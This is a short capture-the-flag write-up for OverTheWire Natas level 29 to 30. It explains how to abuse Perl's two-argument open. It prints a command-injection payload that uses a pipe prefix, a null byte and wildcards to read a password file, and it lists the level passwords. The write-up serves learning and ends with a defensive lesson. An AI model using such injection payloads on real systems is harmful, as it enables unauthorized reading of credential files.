# Natas Level 29 to 30

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Natas |
| Level | 29 -> 30 |
| Status | Complete |

## Objective

Exploit Perl `open` behavior to read the next password.

## Given Access

User: `natas29`

Password:

```text
31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
```

## Method

The script does `open(FD, "$f.txt")` and blocks the literal string `natas`. Prefixing the filename with `|` opens a command pipe, and a null byte prevents the forced `.txt` suffix. Wildcards bypass the `natas` substring filter.

Payload:

```text
|cat /etc/n?tas_webpass/n?tas30%00
```

## Result

Password for `natas30`:

```text
WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
```

## Lesson

Perl two-argument `open` treats pipe characters specially. Use three-argument `open` and avoid shell-interpreted filenames.

## References

- https://overthewire.org/wargames/natas/
